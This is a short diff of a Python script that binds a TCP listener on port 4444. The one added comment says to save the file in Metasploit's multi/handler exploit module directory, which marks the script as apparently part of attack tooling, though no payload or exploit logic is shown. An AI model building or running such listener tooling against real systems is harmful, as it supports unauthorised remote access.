@@ -1,7 +1,7 @@
 import socket
 import paramiko
 import cryptography
-
+# save this in /usr/share/metasploit-framework/modules/exploits/multi/handler
 def serve():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(("0.0.0.0", 4444))
